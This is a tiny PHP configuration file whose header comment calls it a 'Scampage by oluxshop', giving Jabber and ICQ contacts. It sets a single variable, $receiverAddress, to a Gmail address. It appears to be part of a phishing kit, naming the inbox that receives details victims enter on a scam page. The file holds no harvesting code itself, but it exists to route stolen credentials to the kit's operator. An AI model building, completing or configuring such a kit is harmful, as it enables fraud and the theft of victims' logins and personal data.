<?php
/*
 * Scampage by oluxshop
 * Jabber: christopherbourne101@gmail.com
 * ICQ: admin
 */

$receiverAddress = "christopherbourne101@gmail.com";


?>